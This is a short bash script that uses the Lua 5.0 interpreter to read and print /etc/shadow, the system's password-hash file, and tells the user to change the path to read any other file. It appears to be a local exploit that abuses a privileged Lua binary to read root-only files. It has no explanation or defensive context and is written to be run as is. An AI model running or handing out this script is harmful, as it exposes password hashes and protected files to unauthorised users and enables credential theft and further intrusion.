#!/bin/bash
echo -e "By default this script shows the /etc/shadow content. To view other files change the /etc/shadow postion to your file path.\n"
/usr/bin/lua50 -e 'local f=io.open("/etc/shadow", "rb"); print(f:read("*a")); io.close(f);'
